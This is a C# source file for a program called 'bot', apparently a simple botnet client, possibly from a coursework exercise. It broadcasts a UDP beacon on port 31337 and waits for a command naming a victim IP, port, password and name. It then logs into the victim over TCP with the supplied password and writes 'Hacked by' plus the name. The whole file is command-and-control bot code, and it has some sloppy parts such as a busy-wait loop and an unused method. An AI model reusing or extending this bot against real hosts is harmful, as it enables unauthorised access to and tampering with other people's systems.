using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;

namespace bot
{
    class bot
    {
        private static Random random = new Random();
        private static Int32 port = -1;
        private static UdpClient udpClient;
        private static bool wasSent = false;

        static void Main(string[] args)
        {
            try
            {
                Thread th = new Thread(new ThreadStart(sendMessage));
                th.Start();
                connectToVictim(getMessage());
                Console.Read();
            }
            catch { }
        }

        private static void connectToVictim(byte[] message)
        {
            byte[] ipBytes = executeBytes(message, 0, 4);
            byte[] portBytes = executeBytes(message, 4, 2);
            byte[] passBytes = executeBytes(message, 6, 6);
            byte[] nameBytes = executeBytes(message, 12, 32);

            string ip = getIp(ipBytes);
            int port = getPort(portBytes);
            string name = System.Text.Encoding.ASCII.GetString(nameBytes);
            name = name.TrimEnd(' ');

            TcpClient client = new TcpClient(ip, port);
            NetworkStream stream = client.GetStream();
            string response = getRespose(client, stream);
            Console.WriteLine(response);

            stream.Write(passBytes, 0, passBytes.Length);

            response = getRespose(client, stream);
            Console.Write(response);

            Console.Write(response);
            byte[] mess = Encoding.ASCII.GetBytes("Hacked by " + name + "\r\n");
            stream.Write(mess, 0, mess.Length);

            client.Close();
            stream.Close();
        }

        private static string getRespose(TcpClient client, NetworkStream stream)
        {
            byte[] data = new byte[256];
            Int32 bytes = stream.Read(data, 0, data.Length);
            return System.Text.Encoding.ASCII.GetString(data, 0, bytes);
        }

        private static string getIp(byte[] ipBytes)
        {
            string str = "";
            for (int i = 0; i < ipBytes.Length - 1; ++i)
                str += ipBytes[i] + ".";
            return (str + ipBytes[ipBytes.Length - 1] + "");
        }

        private static int getPort(byte[] portBytes)
        {
            return BitConverter.ToUInt16(new byte[2] { portBytes[0], portBytes[1] }, 0);
        }

        private static string getPass(byte[] passBytes)
        {
            string str = "";
            for (int i = 0; i < passBytes.Length; ++i)
                str += passBytes[i];
            return str;
        }

        private static byte[] executeBytes(byte[] message, int offset, int size)
        {
            byte[] arr = new byte[size];
            for (int i = offset; i - offset < size; ++i)
                arr[i - offset] = message[i];
            return arr;
        }

        private static byte[] getMessage()
        {
            while (!wasSent) { }
            IPEndPoint sender = new IPEndPoint(IPAddress.Any, 31337);
            return udpClient.Receive(ref sender);
        }

        private static void sendMessage()
        {
            port = random.Next(49152, 65535);
            udpClient = new UdpClient();
            udpClient.Client.Bind(new IPEndPoint(IPAddress.Any, port));
            Console.Write("Bot is listening on port " + port);
            System.Timers.Timer aTimer = new System.Timers.Timer();
            aTimer.Elapsed += new ElapsedEventHandler(OnTimedEvent);

            wasSent = true;
            aTimer.Interval = 10000;
            aTimer.Enabled = true;
        }
        private static void OnTimedEvent(object source, ElapsedEventArgs e)
        {
            var data = Encoding.UTF8.GetBytes("blabla");
            udpClient.Send(data, data.Length, "255.255.255.255", 31337);
        }
    }
}
